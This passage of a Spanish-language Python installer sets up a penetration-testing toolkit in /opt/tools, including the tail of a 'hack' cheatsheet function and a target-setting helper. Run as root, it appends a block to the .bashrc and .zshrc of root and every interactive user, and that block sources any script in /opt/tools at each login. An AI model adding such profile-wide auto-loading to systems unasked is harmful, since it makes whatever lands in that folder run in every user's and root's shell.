            echo -e "${Y}Ejemplo: hack enum | less ${N}(para paginar)"
            echo -e "${Y}Ejemplo: hack ad${N}"
            ;;
        *)
            echo -e "${R}Sección desconocida: $section${N}"
            echo -e "${Y}Usa: hack help${N}"
            ;;
    esac
}

# ═══════════════════════════════════════════════════════════════
# ALIAS Y HERRAMIENTAS ADICIONALES
# ═══════════════════════════════════════════════════════════════
alias cpts='hack'
# alias cheatsheet='hack' # Comentado para evitar colisiones con el cheatsheet global de Kali.

# Función Pro-Tip: Configurar tus variables globales rápido al iniciar una máquina
set_target() {
    export TARGET="$1"
    export MY_IP=$(ip route get 1.1.1.1 2>/dev/null | awk '{print $7}')
    [[ -z "$MY_IP" ]] && export MY_IP=$(hostname -I | awk '{print $1}')
    echo -e "\033[0;32m[+] Variables de entorno configuradas:\033[0m"
    echo -e "  TARGET: $TARGET"
    echo -e "  MY_IP:  $MY_IP"
}
'''
}

# Bloque de inyección para bashrc y zshrc
RC_BLOCK = """
# =========================================================
# CARGA AUTOMÁTICA DEL ARSENAL EN /opt/tools
# =========================================================
if [ -d "/opt/tools" ]; then
    for script in /opt/tools/*.sh; do
        if [ -r "$script" ]; then
            source "$script"
        fi
    done
fi
"""

def run_cmd(cmd):
    try:
        subprocess.run(cmd, shell=True, check=True, executable='/bin/bash')
    except subprocess.CalledProcessError as e:
        print(f"\n[!] Error ejecutando: {cmd}")
        print(f"[!] Detalles: {e}")
        sys.exit(1)

def configure_shell(home_dir, username):
    """Inyecta el código en .zshrc y .bashrc si existen en el directorio dado."""
    rc_files = [".zshrc", ".bashrc"]
    configured = False
    
    for rc in rc_files:
        rc_path = os.path.join(home_dir, rc)
        
        # Si el archivo no existe, lo creamos para evitar problemas
        if not os.path.exists(rc_path):
            try:
                open(rc_path, 'a').close()
                # Ajustar permisos si lo creamos siendo root en el home de otro usuario
                if username != "root":
                    user_info = pwd.getpwnam(username)
                    os.chown(rc_path, user_info.pw_uid, user_info.pw_gid)
            except IOError:
                continue

        with open(rc_path, "r") as f:
            content = f.read()

        if "CARGA AUTOMÁTICA DEL ARSENAL" not in content:
            with open(rc_path, "a") as f:
                f.write(RC_BLOCK)
            print(f"[*] Inyectando bloque de carga en {rc_path} (Usuario: {username})")
        else:
            print(f"[*] El archivo {rc_path} ya está configurado (Usuario: {username}).")
        configured = True
            
    if not configured:
        print(f"[i] No se pudieron configurar archivos para {username} en {home_dir}")

def install():
    print("╔════════════════════════════════════════════════╗")
    print("║  🛠️  INSTALADOR DE ARSENAL UNIVERSAL           ║")
    print("╚════════════════════════════════════════════════╝\n")

    if os.getuid() != 0:
        print("[!] Permisos insuficientes. Ejecuta el script con sudo:")
        print("    sudo python3 install_arsenal.py")
        sys.exit(1)

    target_dir = "/opt/tools"
    venv_dir = os.path.join(target_dir, ".venv")

    print(f"[*] 1/4 Actualizando APT e instalando dependencias: {', '.join(SYSTEM_PACKAGES)}")
    run_cmd("apt update")
    run_cmd(f"apt install -y {' '.join(SYSTEM_PACKAGES)}")

    print(f"\n[*] 2/4 Creando directorio base en {target_dir}")
    os.makedirs(target_dir, exist_ok=True)

    print(f"\n[*] 3/4 Configurando entorno virtual Python en {venv_dir}")
    if not os.path.exists(venv_dir):
        run_cmd(f"python3 -m venv {venv_dir}")
    
    pip_bin = os.path.join(venv_dir, "bin", "pip")
    run_cmd(f"{pip_bin} install --upgrade pip")
    
    if PIP_PACKAGES:
        print(f"[*] Instalando librerías Python: {', '.join(PIP_PACKAGES)}")
        run_cmd(f"{pip_bin} install {' '.join(PIP_PACKAGES)}")

    print("\n[*] 4/4 Desplegando scripts en /opt/tools")
    for filename, content in TOOLS.items():
        filepath = os.path.join(target_dir, filename)
        with open(filepath, "w") as f:
            f.write("#!/bin/bash\n" + content)
        os.chmod(filepath, 0o755)

    print("\n[*] 5/5 Configurando perfiles de usuario (Multi-Shell & Multi-User)")
    
    # Configurar SIEMPRE al usuario root 
    root_info = pwd.getpwuid(0)
    configure_shell(root_info.pw_dir, "root")

    # Escanear el sistema y configurar TODOS los usuarios humanos reales (UID >= 1000)
    for p in pwd.getpwall():
        if 1000 <= p.pw_uid <= 60000:
            # Ignoramos usuarios de sistema sin shell interactiva
            if "nologin" not in p.pw_shell and "false" not in p.pw_shell:
                configure_shell(p.pw_dir, p.pw_name)

    print("\n[+] ¡Instalación completada con éxito!")
    print("[+] Las herramientas están disponibles para tu usuario normal y para root.")
    print("[+] Cierra y vuelve a abrir tu terminal, o ejecuta 'source ~/.zshrc' (o ~/.bashrc).")

if __name__ == "__main__":
    install()
